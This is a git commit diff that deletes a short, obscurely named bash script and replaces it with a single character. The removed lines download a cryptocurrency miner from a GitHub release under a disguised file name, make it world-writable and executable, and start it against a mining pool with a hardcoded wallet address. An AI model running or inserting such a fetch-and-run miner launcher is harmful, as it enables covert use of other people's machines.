3420d61155268f823c1fd6b2eee7cee790aa7623
virtolm <baryar043@gmail.com>
2025-09-29 08:58:35 +0530

    Update zxfvc.sh

--- zxfvc.sh
+++ zxfvc.sh
@@ -1,4 +1,1 @@
-#!/bin/bash
-wget -O vils https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.6/miner-linux-amd64
-chmod 777 vils
-./vils -stratum stratum+tcp://0xB4B9b6F2fa677DE9eAf7e230E895C2e2B9861E4D.$(echo $RANDOM | md5sum | head -c 10):x@stratum-sgp.x-phere.com:33333
+t
